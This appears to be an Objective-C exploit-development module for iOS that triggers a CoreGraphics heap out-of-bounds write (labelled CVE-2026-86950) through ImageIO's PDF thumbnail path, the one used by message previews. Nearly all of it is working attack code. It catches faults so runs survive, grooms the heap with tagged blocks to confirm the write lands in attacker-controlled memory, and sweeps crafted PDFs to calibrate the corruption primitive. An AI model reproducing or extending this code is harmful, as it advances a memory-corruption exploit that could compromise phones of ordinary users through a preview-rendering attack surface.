#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#import <math.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CVE-2026-86950 — CoreGraphics heap OOB write in aa_cache_render, reached
// through CGImageSourceCreateThumbnailAtIndex (the Messages/WhatsApp preview
// path).  Fixed in 26.7.1 — our build is 26.2b1, so it is present.
//
// The local research (Default Project\cve86950 + EXPLOIT-86950-PLAN.md, from the
// public PoC backtrace at aa_cache_render+2120) gives the semantics: the
// coverage row is 16-bit values and the OOB is
//     *(uint16 *)(cov + 2*i) += delta        (delta small, positive -- a +1 bump)
// where i is derived from the glyph edge coordinates (the composite scales /
// bbox-lie) and the buffer's real width comes from the bbox-lie DX
// (width_px = 32*DX; DX >= 32 -> malloc, DX <= 31 -> alloca/stack).  The index
// runs far past the ~4.3 KB buffer, so the write lands at cov+2*i tens of KB
// away -- NOT "before the buffer", and NOT selectable by the buffer's class.
//
// This module drives the ImageIO thumbnail path exactly like render.c does:
// no CGContext of our own, no font smoothing calls — ImageIO's internal render
// context is what reaches the vulnerable code.  A canary brackets each call so
// a process that never returns leaves the exact file it died on.
// ===========================================================================
// ---------------------------------------------------------------------------
// Fault-tolerant render (the public 112611 PoC's technique, ported): the OOB
// can fault outright -- unmapped or write-protected target -- and a crash loses
// the whole run.  So the thumbnail render runs under sigsetjmp/siglongjmp on an
// alternate signal stack, with the jmp_buf in .bss (the overflow writes through
// a stack-resident one -- the PoC's own warning) and a nested-fault guard.  On
// a fault we record sig/far/pc/esr/WnR and the register file, report them, and
// CONTINUE: the measurement, not the process, is what matters.  A fault that is
// not ours (another thread, or outside a probe) is handed back to the default
// disposition so it still produces a crash report.
// ---------------------------------------------------------------------------
#include <signal.h>
#include <setjmp.h>
#include <sys/mman.h>
#include <string.h>
#include <pthread.h>

static sigjmp_buf           g_fault_jb;
static sigjmp_buf           g_post_jb;   // the second window: post-render phase
static volatile sig_atomic_t g_in_probe = 0;
static volatile sig_atomic_t g_in_fault = 0;
static volatile uint64_t    g_probe_thread = 0;
static volatile unsigned long g_far = 0, g_esr = 0, g_pc = 0;
static volatile int           g_sig = 0;
static volatile unsigned long g_xreg[29];

static void fault_handler(int sig, siginfo_t *si, void *uc) {
    (void)si;
    if (g_in_fault) _exit(70);                          // fault inside the handler
    if (!g_in_probe || (uint64_t)(uintptr_t)pthread_self() != g_probe_thread) {
        signal(sig, SIG_DFL);                           // not ours: let it crash properly
        return;
    }
    g_in_fault = 1;
    ucontext_t *u = (ucontext_t *)uc;
    if (u) {
        g_far = u->uc_mcontext->__es.__far;
        g_esr = u->uc_mcontext->__es.__esr;
        g_pc  = u->uc_mcontext->__ss.__pc;
        for (int i = 0; i < 29; i++) g_xreg[i] = u->uc_mcontext->__ss.__x[i];
    }
    g_sig = sig;
    g_in_fault = 0;
    siglongjmp(g_fault_jb, 1);
}

static void fault_arm(void) {
    static char *alt = NULL;
    if (!alt) {
        alt = mmap(NULL, 256 * 1024, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (alt != MAP_FAILED) {
            stack_t ss; ss.ss_sp = alt; ss.ss_size = 256 * 1024; ss.ss_flags = 0;
            sigaltstack(&ss, NULL);
        }
    }
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_sigaction = fault_handler;
    sa.sa_flags = SA_SIGINFO | SA_ONSTACK | SA_NODEFER;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS,  &sa, NULL);
    sigaction(SIGTRAP, &sa, NULL);   // the malloc freelist check traps too
}

static NSString *ModThumbPDF(NSString *pdfName, NSString *tag, int maxPx) {
    NSString *path = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSURL *url = [NSURL fileURLWithPath:path];
    CGImageSourceRef src = CGImageSourceCreateWithURL((CFURLRef)url, NULL);
    if (!src) return [NSString stringWithFormat:@"%@: CGImageSourceCreateWithURL failed", tag];

    int sz = maxPx;
    CFNumberRef px = CFNumberCreate(NULL, kCFNumberIntType, &sz);
    CFStringRef k[] = { kCGImageSourceCreateThumbnailFromImageAlways,
                        kCGImageSourceThumbnailMaxPixelSize };
    CFTypeRef   v[] = { kCFBooleanTrue, px };
    CFDictionaryRef opts = CFDictionaryCreate(NULL, (const void **)k, (const void **)v, 2,
                                              &kCFTypeDictionaryKeyCallBacks,
                                              &kCFTypeDictionaryValueCallBacks);
    CFRelease(px);

    AvePost([NSString stringWithFormat:@"%@ BEFORE thumbnail of %@ (max %d px)",
             tag, pdfName, maxPx]);
    // the write itself, crash-protected: a fault here no longer loses the run
    CGImageRef img = NULL;
    g_sig = 0; g_far = 0; g_esr = 0; g_pc = 0;
    fault_arm();
    g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
    if (sigsetjmp(g_fault_jb, 1) == 0) {
        g_in_probe = 1;
        img = CGImageSourceCreateThumbnailAtIndex(src, 0, opts);   // <-- the write
        g_in_probe = 0;
    } else {
        g_in_probe = 0;
        AvePost([NSString stringWithFormat:@"%@ FAULT in render: sig=%d far=%#llx "
                 @"pc=%#llx esr=%#08llx WnR=%d (esr&0x3f=%#llx) - the write hit a "
                 @"page it may not touch; run continues", tag, g_sig,
                 (unsigned long long)g_far, (unsigned long long)g_pc,
                 (unsigned long long)g_esr, (int)((g_esr >> 6) & 1),
                 (unsigned long long)(g_esr & 0x3f)]);
        unsigned long bestd = ~0UL; int besti = -1;
        for (int i = 0; i < 29; i++) {
            unsigned long v = g_xreg[i]; if (!v) continue;
            unsigned long d = (v > g_far) ? (v - g_far) : (g_far - v);
            if (d < bestd) { bestd = d; besti = i; }
        }
        if (besti >= 0)
            AvePost([NSString stringWithFormat:@"%@ FAULT register x%d = %#llx, "
                     @"|far - x%d| = %#lx", tag, besti,
                     (unsigned long long)g_xreg[besti], besti, bestd]);
        CFRelease(opts);          // ImageIO state may be inconsistent after a fault,
        CFRelease(src);           // so do not touch anything else of its making
        return [NSString stringWithFormat:@"%@: FAULT sig=%d far=%#llx (fault caught, "
                @"carpet scan still runs)", tag, g_sig, (unsigned long long)g_far];
    }
    CFRelease(opts);

    NSString *res;
    if (img) {
        size_t w = CGImageGetWidth(img), h = CGImageGetHeight(img);
        res = [NSString stringWithFormat:@"%@: thumbnail OK %zux%zu (no fault)", tag, w, h];
        AvePost([NSString stringWithFormat:@"%@ canary AFTER thumbnail (survived)", tag]);
        CFRelease(img);
    } else {
        res = [NSString stringWithFormat:@"%@: thumbnail returned NULL (no fault)", tag];
    }
    CFRelease(src);
    return res;
}

// newjail's detection method for a heap OOB that does not fault: pre-map blocks
// with a marker, trigger, then scan for CHANGED words.  If the OOB write lands
// inside one of our blocks, the marker changes — that is a proof of
// attacker-controlled corruption, usable even when the process survives.
// The expected u64 at a byte offset of a carpet block: every u16 carries a known
// pattern (0x0100 + (index & 0xff)) except the marker pair at +2048/+2050 of a
// detector.  A uniform 0xA5 fill could not tell "+=" from "store zero" (0xa5a5
// + 0x5a5b wraps to 0x0000 either way); the pattern can: a +1-style bump shows
// as pattern+delta, a zero store as 0x0000.
static uint64_t CarpetWant(size_t byteOff, int id) {
    uint16_t p[4];
    for (int t = 0; t < 4; t++) {
        size_t j = (byteOff / 2) + (size_t)t;
        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
        if (id >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xC000 + id);
        p[t] = v;
    }
    return (uint64_t)p[0] | ((uint64_t)p[1] << 16) | ((uint64_t)p[2] << 32) | ((uint64_t)p[3] << 48);
}

static void CarpetFill(void *p, size_t bytes, int id) {
    uint16_t *m = (uint16_t *)p;
    size_t n16 = bytes / 2;
    for (size_t j = 0; j < n16; j++) {
        uint16_t v = (uint16_t)(0x0100 + (j & 0xFF));
        if (id >= 0 && (j == 1024 || j == 1025)) v = (uint16_t)(0xC000 + id);
        m[j] = v;
    }
}

static int ModGroomScan(int regions, size_t each, NSString *pdfName, int maxPx) {
    (void)each;
    // The reference layout that actually hit (`oob: *** HIT obj[42]
    // 0xC02A->0xC02B`, tpOOBDetect/tpGroomHeap): `regions` detector blocks of
    // 4096 B, each carrying the 16-bit marker 0xC000+obj at +2048 and +2050,
    // interleaved with coverage-sized groom buffers so the raster's own
    // allocation lands inside the carpet.  A small-size-class ladder can not
    // cover the write: the OOB index i (from the edge coordinates) puts the
    // 16-bit += at cov+2*i, potentially tens of KB past a ~4.3 KB buffer; a
    // dense 4 KB carpet covers every i.  Two measured lessons built in:
    //   - the 15 Nov CFNetwork freelist trap: our logger must not die between
    //     carpet and verdict (the module order already puts the groom first);
    //   - the 15/16 Nov runs: 8-class ladders AND appended ~64 KB classes all
    //     read 0 corrupted words, because neither matched the real target.
    size_t groomSz[] = { 4032, 4288 };   // 4*(32*DX+16) for DX=31 and DX=33
    int nGroom = (int)(sizeof(groomSz) / sizeof(groomSz[0]));
    int cap = regions * (1 + nGroom);
    // the bookkeeping lives on the STACK, not the heap: the OOB can zero heap
    // words (it zeroed our detector fill), and a corrupted ptrs[i] would make the
    // full scan walk a bad pointer and die mid-measurement.
    if (cap <= 0 || cap > 4096) return -1;
    void *ptrs[4096];
    size_t szl[4096];
    int ids[4096];
    int n = 0, obj = 0;
    for (int r = 0; r < regions; r++) {
        void *d = malloc(4096);
        if (d) { CarpetFill(d, 4096, obj); ptrs[n] = d; szl[n] = 4096; ids[n] = obj; n++; obj++; }
        for (int gi = 0; gi < nGroom; gi++) {
            void *g = malloc(groomSz[gi]);
            if (g) { CarpetFill(g, groomSz[gi], -1); ptrs[n] = g; szl[n] = groomSz[gi]; ids[n] = -1; n++; }
        }
    }
    AvePost([NSString stringWithFormat:@"86950 carpet: %d detectors x 4096 B "
             @"(marker 0xC000+obj at +2048/+2050) interleaved with 4032 B/4288 B "
             @"coverage-class buffers", obj]);
    int dx = 0, leaf = 0;
    if (sscanf(pdfName.UTF8String, "lf_dx%2d_%6d", &dx, &leaf) == 2 && leaf > 0) {
        AvePost([NSString stringWithFormat:@"86950 geometry: dx=%d leaf=%d "
                 @"width_px=%d -> coverage buffer ~%zu B (4*(32*DX+16); DX>=32 is "
                 @"the malloc side); the write lands at cov+2*i, far past it",
                 dx, leaf, 32 * dx, (size_t)(4 * (32 * dx + 16))]);
    }

    NSString *r = ModThumbPDF(pdfName, [NSString stringWithFormat:@"86950-C%d", obj], maxPx);
    AvePost([NSString stringWithFormat:@"86950 carpet-render: %@", r]);

    // The post-render phase is its own guarded window: if the render's OOB hit
    // malloc metadata, the NEXT allocation (these very AvePost/NSString calls)
    // trips the zone consistency check -- the 15 Nov CFNetwork trap, but now on
    // our own thread.  The render guard cannot catch that (it runs outside the
    // probe window), so the scan and everything it prints run under g_post_jb:
    // a fault there is recorded, named, and the module returns with the verdict
    // partial-but-honest instead of the process dying silently.
    if (sigsetjmp(g_post_jb, 1) == 0) {
        g_probe_thread = (uint64_t)(uintptr_t)pthread_self();
        g_in_probe = 1;

    int corrupt = 0;
    int printed = 0;
    for (int i = 0; i < n; i++) {
        void *p = ptrs[i];
        size_t sz = szl[i];
        uint64_t *q = (uint64_t *)p;
        // markers at +2048/+2050 are part of CarpetWant below
        // the marker lives at +2048 (two u16 at +2048/+2050), NOT at +0: the earlier
        // build compared want0 at offset 0, so every detector mismatched there
        // AND at +2048 and the run reported a false "HEAP CORRUPTION CONFIRMED".
        // The log evidence was in the output itself: the "block @+0x800" lines
        // showed the markers intact (c000c000) while the "detector" lines showed
        // a FILL word. Now the marker is checked where it was written.
        // full scan of EVERY block, no early cutoff: the first fixed-offset run stopped
    // at the >16 cutoff, so only the first 17 detectors were ever measured and
    // the shape of the hit (which u16 inside the word, and how many blocks) was
    // invisible.  Print got AND want verbatim, up to 24 lines, then the total.
    // the blocks are intentionally NOT freed: if the render's OOB also touched
        // malloc metadata (the 15 Nov CFNetwork freelist trap), free() trips the
        // zone's consistency check and kills the process -- and it would do so
        // BETWEEN the corruption lines and the verdict.  The carpet is per-run
        // (the module returns right after the verdict), so the ~1.5 MB leak is
        // the price of a complete measurement.
        for (size_t off = 0; off + 8 <= sz; off += 8) {
            uint64_t want = CarpetWant(off, ids[i]);
            if (q[off / 8] != want) {
                corrupt++;
                if (printed < 24) {
                    printed++;
                    AvePost([NSString stringWithFormat:@"86950 CORRUPTION block %d "
                             @"(+%zu) @+%#zx = %#018llx want %#018llx id=%d",
                             i, sz, off, (unsigned long long)q[off / 8],
                             (unsigned long long)want, ids[i]]);
                }
                }
            }
        }
    // ptrs/szl/ids kept alive on purpose (see above): no free at all here.
        g_in_probe = 0;
        AvePost([NSString stringWithFormat:@"86950 carpet scan: %d corrupted words (%d "
                 @"printed) over the whole carpet (%d blocks)", corrupt, printed, n]);
    } else {
        g_in_probe = 0;
        // a fault INSIDE the scan/print phase: name it, keep the process alive
        AvePost([NSString stringWithFormat:@"86950 FAULT post-render phase: sig=%d "
                 @"far=%#llx pc=%#llx esr=%#08llx (an allocation tripped a corrupted "
                 @"zone - the metadata-corruption branch; verdict is partial)",
                 g_sig, (unsigned long long)g_far, (unsigned long long)g_pc,
                 (unsigned long long)g_esr]);
    }
    return corrupt;
}

// Sweep the calibrated OOB-distance family (f_dxNN_kMMMM.pdf, one PDF per glyph
// geometry: distance = 4*(64*dx + K) bytes before the coverage buffer).
// R86950_START=<index> lets a later run resume where the previous one stopped,
// so a distance sweep survives the process dying mid-way.
static int ModSweepDistance(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"f_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    NSComparator byDist = ^(NSString *a, NSString *b) {
        // f_dx<NN>_k<MMMM>.pdf — sort by the OOB distance 4*(64*dx + K)
        int dx1 = [[a substringWithRange:NSMakeRange(5, 2)] intValue];
        int k1 = [[a substringWithRange:NSMakeRange(9, 4)] intValue];
        int dx2 = [[b substringWithRange:NSMakeRange(5, 2)] intValue];
        int k2 = [[b substringWithRange:NSMakeRange(9, 4)] intValue];
        int64_t d1 = 4 * (64 * dx1 + k1), d2 = 4 * (64 * dx2 + k2);
        return d1 < d2 ? NSOrderedAscending : (d1 > d2 ? NSOrderedDescending : NSOrderedSame);
    };
    [fam sortUsingComparator:byDist];
    if (!fam.count) {
        AvePost(@"86950 sweep: no f_dx family in the bundle");
        return -1;
    }
    int start = 0;
    const char *se = getenv("R86950_START");
    if (se && *se) start = atoi(se);
    if (start < 0 || start >= (int)fam.count) start = 0;
    AvePost([NSString stringWithFormat:@"86950 sweep: %d PDFs (distances %d..%d bytes), "
             @"starting at index %d", (int)fam.count,
             4 * (64 * [[fam[0] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[0] substringWithRange:NSMakeRange(9, 4)] intValue]),
             4 * (64 * [[fam[fam.count - 1] substringWithRange:NSMakeRange(5, 2)] intValue] +
                 [[fam[fam.count - 1] substringWithRange:NSMakeRange(9, 4)] intValue]),
             start]);

    for (int i = start; i < (int)fam.count; i++) {
        NSString *f = fam[i];
        int dx = [[f substringWithRange:NSMakeRange(5, 2)] intValue];
        int k = [[f substringWithRange:NSMakeRange(9, 4)] intValue];
        int dist = 4 * (64 * dx + k);
        NSString *tag = [NSString stringWithFormat:@"86950-D%d", dist];
        // a fresh 8MB-tagged region right before, so a write that survives is
        // still visible: this distance's own canary AND our tag.
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950D %@ (dx=%d k=%d dist=%d) -> %@",
                 f, dx, k, dist, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 SWEEP STOPPED at distance %d (%@)",
                     dist, f]);
            return dist;
        }
    }
    AvePost(@"86950 sweep: every distance rendered without a fault");
    return 0;
}

// A/B sweep for the crash cause: chainctl_dNN.pdf is the SAME composite-glyph
// chain depth with a BENIGN geometry, chaintri_dNN.pdf is the real trigger with
// the same chain.  If the benign ones also kill the process, the death is the
// chain exhausting the raster thread's 544 KB stack and NOT our write.
static void ModSweepChain(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    for (NSString *fam in @[@"chaintri_", @"chainctl_"]) {
        NSMutableArray *files = [NSMutableArray array];
        for (NSString *f in all) {
            if ([f hasPrefix:fam] && [f hasSuffix:@".pdf"]) [files addObject:f];
        }
        [files sortUsingSelector:@selector(compare:)];
        if (!files.count) continue;
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: %d PDFs",
                 fam, (int)files.count]);
        for (NSString *f in files) {
            NSString *tag = [NSString stringWithFormat:@"86950-%@%@",
                             [fam isEqualToString:@"chainctl_"] ? @"CTL" : @"TRI",
                             [f substringWithRange:NSMakeRange(fam.length, 3)]];
            NSString *r = ModThumbPDF(f, tag, 32);
            AvePost([NSString stringWithFormat:@"86950AB %@ (%@) -> %@", tag, f, r]);
            if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
                AvePost([NSString stringWithFormat:@"86950AB STOPPED in family %@ on %@",
                         fam, f]);
                return;
            }
        }
        AvePost([NSString stringWithFormat:@"86950 chain-AB family %@: all survived", fam]);
    }
}

// Report what is actually inside the installed bundle, so a stale install is
// visible in the log instead of being guessed at.
static void ModReportBundle(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    int fdx = 0, chain = 0, pdfs = 0;
    for (NSString *f in all) {
        if (![f hasSuffix:@".pdf"]) continue;
        pdfs++;
        if ([f hasPrefix:@"f_dx"]) fdx++;
        if ([f hasPrefix:@"chaintri_"] || [f hasPrefix:@"chainctl_"]) chain++;
    }
    AvePost([NSString stringWithFormat:@"86950 BUNDLE pdfs=%d f_dx=%d chain=%d (chain>0 "
             @"means the A/B build is installed)", pdfs, fdx, chain]);
    if (chain == 0)
        AvePost(@"86950 BUNDLE is STALE: no chain A/B PDFs — the phone runs an older "
                 @"IPA, reinstall the newest one from the desktop");
}

// The family built with the CRASHING font's own structure (nine-level composite
// chain, gen_font.py): k_dxNN_kMMMM.pdf, where DX sweeps the alloca/malloc
// boundary of the coverage buffer and K the write distance in 4096-byte units.
static void ModSweepK(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"k_dx"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) return;
    AvePost([NSString stringWithFormat:@"86950 K-family: %d PDFs (DX 1..64 x K 0..1024, "
             @"the crashing font's own structure)", (int)fam.count]);
    for (NSString *f in fam) {
        NSString *dist = [f substringWithRange:NSMakeRange(8, 6)];   // NN_kKK -> approx
        NSString *tag = [NSString stringWithFormat:@"86950-K%@", dist];
        NSString *r = ModThumbPDF(f, tag, 32);
        AvePost([NSString stringWithFormat:@"86950K %@ -> %@", f, r]);
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 K-family STOPPED on %@", f]);
            return;
        }
    }
    AvePost(@"86950 K-family: every PDF returned without a fault");
}

// The LEAF family: the crashing font's exact structure (nine-level chain, DX=33
// and DX=31 straddling the alloca/malloc boundary) with the leaf trigger
// coordinate swept 500..32000.  lf_dx33_032000 is a byte-for-byte equivalent of
// the font that actually crashes (only the table-directory offsets differ), so
// this is both a reproduction check and the distance calibration.
static void ModSweepLeaf(void) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle
                                                                     error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"lf_"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) return;
    AvePost([NSString stringWithFormat:@"86950 LEAF family: %d PDFs (DX 31/33 x leaf "
             @"500..32000, the crashing font's own structure)", (int)fam.count]);
    // Each geometry gets its OWN carpet: the write offset is cov+2*i with i set
    // by that file's edge coordinates, so one carpet cannot cover the whole
    // family -- but one carpet per file covers each i range.  A crash mid-sweep
    // still leaves the last file in the log (canary + carpet lines).
    for (NSString *f in fam) {
        int c = ModGroomScan(64, 0, f, 32);
        AvePost([NSString stringWithFormat:@"86950LF-C %@ -> %d corrupted words", f, c]);
        if (c > 0) {
            AvePost([NSString stringWithFormat:@"86950 LEAF STOPPED on %@ (carpet hit)", f]);
            return;
        }
    }
    AvePost(@"86950 LEAF family: every carpet came back clean");
}

// Repeat the calibrated trigger many times in ONE run.  The crash is layout
// dependent (the same leaf=8000 PDF killed the process in one run and rendered
// clean in another), so a single render cannot be calibrated -- a series can.
// R86950_REPEAT=<n> sets the count (default 40).
static void ModRepeatCalibrated(void) {
    NSString *cal = @"lf_dx33_000500.pdf";   // the heap (malloc) side
    NSString *calPath = [[NSBundle mainBundle].bundlePath
                         stringByAppendingPathComponent:cal];
    if (![[NSFileManager defaultManager] fileExistsAtPath:calPath]) return;
    int reps = 40;
    const char *re = getenv("R86950_REPEAT");
    if (re && *re) reps = atoi(re);
    if (reps < 1) reps = 1;
    AvePost([NSString stringWithFormat:@"86950 REPEAT %@ x%d", cal, reps]);
    int survived = 0;
    for (int i = 0; i < reps; i++) {
        NSString *tag = [NSString stringWithFormat:@"86950-R%02d", i];
        NSString *r = ModThumbPDF(cal, tag, 32);
        survived++;
        if (![r containsString:@"OK"] && ![r containsString:@"NULL"]) {
            AvePost([NSString stringWithFormat:@"86950 REPEAT STOPPED after %d survivors",
                     survived - 1]);
            return;
        }
    }
    AvePost([NSString stringWithFormat:@"86950 REPEAT: all %d renders survived", reps]);
}

NSString *ModCVE86950(void) {
    // Order that gets an answer: bundle report -> control -> groom verdict ->
    // repeat calibration -> leaf/chain/K/distance sweeps (R86950_START=<index>
    // to jump to any distance).  The groom is first because its verdict is the
    // run's purpose; a later freelist trap (secondary corruption) must not be
    // able to kill the process before that line is flushed.
    AveLog(@"    CVE-2026-86950: ImageIO PDF thumbnail OOB (fixed only in 26.7.1)");
    AvePost(@"86950 start");
    ModReportBundle();
    // Groom verdict FIRST, before the 40-render repeat: the repeat's OOB writes
    // are what corrupt malloc metadata, and the freelist check that later kills
    // the process (observed on the CFNetwork CacheDB-write thread, 14/15 Nov)
    // could fire before a late verdict line is flushed. The groom line is the
    // run's purpose -- everything else is calibration.
    NSString *ctl = ModThumbPDF(@"control_86950.pdf", @"86950-CTL", 256);
    AvePost([NSString stringWithFormat:@"86950CTL %@", ctl]);
    if (![ctl containsString:@"OK"] && ![ctl containsString:@"NULL"]) {
        AvePost(@"86950 verdict: CONTROL failed — the thumbnail path is broken, not the bug");
        return [NSString stringWithFormat:@"86950: CONTROL failed (%@)", ctl];
    }
    // The calibrated trigger for the heap side: DX=33 (malloc, per the generator's
    // own comment: DX <= 31 -> alloca/stack, DX >= 32 -> malloc/heap).  The
    // crash report proves this is where the write lands: the freelist
    // consistency check in xzm_xzone_malloc_freelist_outlined trips on the next
    // allocation, i.e. the previous render's OOB hit malloc metadata.  Groom
    // first so that what it hits is OUR tagged memory instead of metadata.
    NSString *cal = @"lf_dx33_000500.pdf";
    NSString *calPath = [[NSBundle mainBundle].bundlePath stringByAppendingPathComponent:cal];
    if ([[NSFileManager defaultManager] fileExistsAtPath:calPath]) {
        AvePost([NSString stringWithFormat:@"86950 CALIBRATED TRIGGER %@ + groom", cal]);
        int corrupt = ModGroomScan(128, 8 << 20, cal, 32);   // reference detector count
        if (corrupt) {
            AvePost(@"86950 verdict: HEAP CORRUPTION CONFIRMED in our tagged regions");
            return [NSString stringWithFormat:@"86950: HEAP CORRUPTION CONFIRMED (%d words "
                    @"changed in the tagged regions - the write is live and lands in "
                    @"memory we control)", corrupt];
        }
        AvePost(@"86950 groom: no changed words in the tagged regions this run");
    }
    ModRepeatCalibrated();   // after the verdict, not before it

    ModSweepLeaf();
    ModSweepChain();
    ModSweepK();
    int d = ModSweepDistance();
    if (d > 0)
        return [NSString stringWithFormat:@"86950: the OOB write reached live state at "
                @"distance %d bytes before the coverage buffer (R86950_START to continue)", d];
    AvePost(@"86950 verdict: no distance produced a fault");
    return @"86950: distance sweep completed without a fault";
}
